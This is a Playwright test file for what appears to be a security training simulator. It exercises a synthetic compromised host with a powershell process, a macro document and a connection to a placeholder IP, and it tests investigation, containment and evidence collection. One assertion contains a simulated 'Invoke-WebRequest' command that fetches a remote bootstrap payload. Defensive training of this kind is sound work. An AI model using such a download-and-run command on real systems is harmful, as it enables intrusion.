import {
  expect,
  test,
  type Page,
} from "@playwright/test";

async function runRangeCommand(
  page: Page,
  command: string,
) {
  const input = page.getByLabel(
    "Range command",
  );

  await input.fill(command);
  await page.getByRole(
    "button",
    { name: "Run", exact: true },
  ).click();
}

async function openRange(
  page: Page,
) {
  await page.getByRole(
    "button",
    { name: "Range", exact: true },
  ).click();

  return page.getByRole(
    "region",
    { name: "Range synthetic host workspace" },
  );
}

test("Endpoint pivots into a coherent synthetic host and supports controlled investigation commands", async ({
  page,
}) => {
  await page.goto("/");

  await page.getByRole(
    "button",
    { name: "Endpoint", exact: true },
  ).click();

  const edr = page.getByRole(
    "region",
    { name: "EDR endpoint workspace" },
  );

  await expect(edr).toContainText("FIN-LT-04");
  await edr.getByRole(
    "button",
    { name: "Open synthetic host" },
  ).click();

  const range = page.getByRole(
    "region",
    { name: "Range synthetic host workspace" },
  );

  await expect(range).toBeVisible();
  await expect(range).toContainText("FIN-LT-04");
  await expect(range).toContainText("powershell.exe");
  await expect(range).toContainText("8420");
  await expect(range).toContainText("QuarterlyReview.docm");
  await expect(range).toContainText("203.0.113.77:443");

  await runRangeCommand(page, "ps");
  await expect(
    range.locator(".range-terminal-output"),
  ).toContainText(
    "8420   running",
  );

  await runRangeCommand(page, "net");
  await expect(
    range.locator(".range-terminal-output"),
  ).toContainText(
    "203.0.113.77:443",
  );

  await runRangeCommand(
    page,
    "cat /Users/smartinez/AppData/Local/Temp/finance-update.ps1",
  );
  await expect(
    range.locator(".range-terminal-output"),
  ).toContainText(
    "Invoke-WebRequest https://203.0.113.77/bootstrap",
  );

  await runRangeCommand(page, "kill 8420");

  const powershellState = range
    .locator(".range-inspector-row")
    .filter({ hasText: "powershell.exe" });

  await expect(powershellState)
    .toContainText("terminated");
  await expect(
    range.locator(".range-terminal-output"),
  ).toContainText(
    "Terminated synthetic host process 8420.",
  );
});

test("Range rejects unknown commands and reset reconstructs the authored host", async ({
  page,
}) => {
  await page.goto("/");
  let range = await openRange(page);

  await runRangeCommand(page, "kill 8420");
  await expect(
    range.locator(".range-pane-heading").first(),
  ).toContainText("1 commands");

  await runRangeCommand(page, "whoami");
  await expect(range).toContainText(
    "Unknown Range command: whoami. Type help for the supported command set.",
  );
  await expect(
    range.locator(".range-pane-heading").first(),
  ).toContainText("1 commands");

  await page.getByRole(
    "button",
    { name: "Reset scenario" },
  ).click();
  range = await openRange(page);

  await expect(
    range.locator(".range-pane-heading").first(),
  ).toContainText("0 commands");
  await expect(
    range
      .locator(".range-inspector-row")
      .filter({ hasText: "powershell.exe" }),
  ).toContainText("running");
});

test("Range observation can be collected into Case with Range provenance", async ({
  page,
}) => {
  await page.goto("/");
  const range = await openRange(page);

  await runRangeCommand(page, "net");
  await range.getByRole(
    "button",
    { name: "Collect output to Case" },
  ).click();

  await expect(range).toContainText(
    "Range evidence collected",
  );

  await page.locator(".workspace-nav").getByRole(
    "button",
    { name: /^Case/ },
  ).click();

  const caseWorkspace = page.getByRole(
    "region",
    { name: "Case incident command workspace" },
  );
  const evidenceLedger = page.getByRole(
    "region",
    { name: "Case evidence ledger" },
  );

  await expect(caseWorkspace).toBeVisible();
  await expect(evidenceLedger).toContainText(
    "Range evidence collected (network): network-state",
  );
  await expect(evidenceLedger).toContainText("range");
  await expect(evidenceLedger).toContainText(
    "ip: 203.0.113.77",
  );

  await page.getByRole(
    "button",
    { name: "Reset scenario" },
  ).click();
  await page.locator(".workspace-nav").getByRole(
    "button",
    { name: "Case", exact: true },
  ).click();

  await expect(
    page.getByRole(
      "region",
      { name: "Case evidence ledger" },
    ),
  ).toContainText(
    "Collect events from SIEM, Endpoint, Identity, or Investigation",
  );
});

test("Range containment becomes canonical EDR and SIEM response history", async ({
  page,
}) => {
  await page.goto("/");
  const range = await openRange(page);

  await runRangeCommand(page, "kill 8420");

  const connection = range
    .locator(".range-inspector-row")
    .filter({ hasText: "203.0.113.77:443" });

  await expect(connection).toContainText("closed");

  await page.locator(".workspace-nav").getByRole(
    "button",
    { name: "Endpoint", exact: true },
  ).click();

  const hostHistory = page.getByRole(
    "region",
    { name: "EDR Range response history" },
  );

  await expect(hostHistory).toBeVisible();
  await expect(hostHistory).toContainText(
    "HOST_PROCESS_TERMINATED",
  );
  await expect(hostHistory).toContainText("8420");

  await hostHistory.getByRole(
    "button",
    { name: "Open canonical event in SIEM" },
  ).click();

  const siem = page.getByRole(
    "region",
    { name: "SIEM search workspace" },
  );

  await expect(
    page.getByLabel("SIEM query"),
  ).toHaveValue(
    "eventId:range-command-1-event",
  );
  await expect(siem).toContainText(
    "Range terminated process 8420",
  );
  await expect(siem).toContainText(
    "HOST_PROCESS_TERMINATED",
  );
});
